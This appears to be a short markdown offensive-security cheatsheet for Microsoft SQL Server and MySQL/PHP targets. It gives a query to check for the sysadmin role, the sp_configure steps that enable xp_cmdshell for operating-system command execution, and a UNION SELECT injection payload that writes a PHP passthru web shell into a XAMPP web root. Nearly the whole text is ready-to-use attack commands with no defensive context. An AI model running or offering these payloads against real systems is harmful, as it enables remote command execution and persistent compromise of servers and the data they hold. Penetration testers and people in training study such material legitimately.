# SQL Hacking Cheatsheet

<!--
##################################################################
##################################################################
-->

#### Determine if Current User is Sysadmin

`select is_srvrolemember('sysadmin')`

<!--
##################################################################
##################################################################
-->

#### Spawn Command Shell once Sysadmin

`EXEC sp_configure 'Show Advanced Options', 1;`
'reconfigure;'
`sp_configure;`
`EXEC sp_configure 'xp_cmdshell', 1`
`reconfigure;`
`xp_cmdshell "whoami"`

<!--
##################################################################
##################################################################
-->

#### Inject Web Shell

`' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php' -- -' `
